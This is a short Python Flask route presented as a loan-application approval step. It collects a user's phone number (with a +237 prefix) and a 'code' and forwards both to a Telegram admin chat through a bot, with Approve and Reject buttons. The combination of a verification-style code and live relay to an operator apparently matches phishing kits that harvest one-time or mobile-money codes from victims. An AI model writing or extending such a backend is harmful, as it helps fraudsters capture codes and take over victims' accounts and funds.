@app.route('/api/request-approval', methods=['POST'])
def request_approval():
    data = request.json
    app_id = str(uuid.uuid4())
    pending_requests[app_id] = "pending"
    
    # CHANGED: Now uses Phone and Code
    phone = data.get('phone', 'Unknown')
    code = data.get('code', 'Unknown')
    
    text = f"🚨 *New Loan Application*\n\nPhone: +237 {phone}\nCode: {code}\n\nDo you approve?"
    
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"approve_{app_id}"},
            {"text": "❌ Reject", "callback_data": f"reject_{app_id}"}
        ]]
    }
    
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, json={
        "chat_id": ADMIN_CHAT_ID,
        "text": text,
        "parse_mode": "Markdown",
        "reply_markup": keyboard
    })
    
    return jsonify({"app_id": app_id})